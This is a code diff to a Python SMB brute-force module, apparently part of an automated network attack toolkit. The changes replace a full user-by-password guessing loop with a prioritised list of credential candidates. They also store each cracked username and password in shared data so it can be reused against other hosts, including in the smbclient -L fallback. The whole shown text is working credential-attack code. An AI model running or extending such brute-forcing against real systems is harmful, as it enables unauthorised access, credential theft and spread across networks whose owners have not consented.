@@ -10,7 +10,7 @@ from rich.console import Console
 from rich.progress import Progress, BarColumn, TextColumn, SpinnerColumn
 from smb.SMBConnection import SMBConnection
 from queue import Queue
-from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv
+from shared import SharedData, netkb_targets, append_csv_rows, dedupe_csv, credential_candidates, record_cracked_cred
 from logger import Logger
 
 # Configure the logger
@@ -150,6 +150,7 @@ class SMBConnector:
                         if share not in IGNORED_SHARES:
                             self.results.append([mac_address, adresse_ip, hostname, share, user, password, port])
                             logger.success(f"Found credentials for IP: {adresse_ip} | User: {user} | Share: {share}")
+                    record_cracked_cred(self.shared_data, user, password)
                     self.save_results()
                     self.removeduplicates()
                     success_flag[0] = True
@@ -166,14 +167,14 @@ class SMBConnector:
         mac_address = match['MAC Address']
         hostname = match['Hostnames']
 
-        total_tasks = len(self.users) * len(self.passwords)
-        
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
+        candidates = credential_candidates(self.shared_data, self.users, self.passwords)
+        total_tasks = len(candidates)
+
+        for user, password in candidates:
+            if self.shared_data.orchestrator_should_exit:
+                logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                return False, []
+            self.queue.put((adresse_ip, user, password, mac_address, hostname, port))
 
         success_flag = [False]
         threads = []
@@ -202,8 +203,7 @@ class SMBConnector:
         # If no success with direct SMB connection, try smbclient -L
         if not success_flag[0]:
             logger.info(f"No successful authentication with direct SMB connection. Trying smbclient -L for {adresse_ip}")
-            for user in self.users:
-                for password in self.passwords:
+            for user, password in credential_candidates(self.shared_data, self.users, self.passwords):
                     progress.update(task_id, advance=1)
                     shares = self.smbclient_l(adresse_ip, user, password)
                     if shares:
@@ -215,6 +215,7 @@ class SMBConnector:
                                     self.save_results()
                                     self.removeduplicates()
                                     success_flag[0] = True
+                                    record_cracked_cred(self.shared_data, user, password)
                     if self.shared_data.timewait_smb > 0:
                         time.sleep(self.shared_data.timewait_smb)  # Wait for the specified interval before the next attempt
 
